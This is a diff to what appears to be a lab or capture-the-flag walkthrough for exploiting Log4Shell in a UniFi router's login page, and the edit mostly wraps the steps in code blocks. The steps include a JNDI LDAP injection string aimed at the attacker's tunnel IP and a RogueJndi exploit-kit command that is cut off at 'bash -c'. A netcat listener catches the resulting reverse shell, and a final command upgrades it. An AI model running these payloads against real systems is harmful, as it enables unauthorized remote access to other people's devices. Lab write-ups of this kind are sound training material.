@@ -19,9 +19,16 @@ The excellent writeup can be found [here](https:/www.sprocketsecurity.com/resour
 
 Step 1: Identify an injectable field. For instance, the unifi router has one in the remember field of the login page.
 
-Step 2: inject the following string into the field "${jndi:ldap://{Tun0 IP Address}/whatever}"
+Step 2: inject the following string into the field 
 
-Step 3: run the following command on your machine to confirm the app is reaching out: `sudo tcpdump -i {interface} port 389`
+```
+${jndi:ldap://{Tun0 IP Address}/whatever}
+```
+Step 3: run the following command on your machine to confirm the app is reaching out: 
+
+```
+sudo tcpdump -i {interface} port 389
+```
 
 Step 4: Make sure you have openjdk and maven installed for exploit kit.
 ```
@@ -52,7 +59,10 @@ java -jar target/RogueJndi-1.1.jar --command "bash -c
 ```
 
 Step 8. Setup a netcat listener to catch the shell:
+
+```
 nc -lvpn 4444
+```
 
 Step 9: Set the payload in the app to call to your malicious server's ldap resource:
 ```
@@ -60,4 +70,7 @@ ${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
 ```
 
 Step 10: Enjoy your new shell by upgrading it:
+
+```
 script /dev/null -c bash
+```
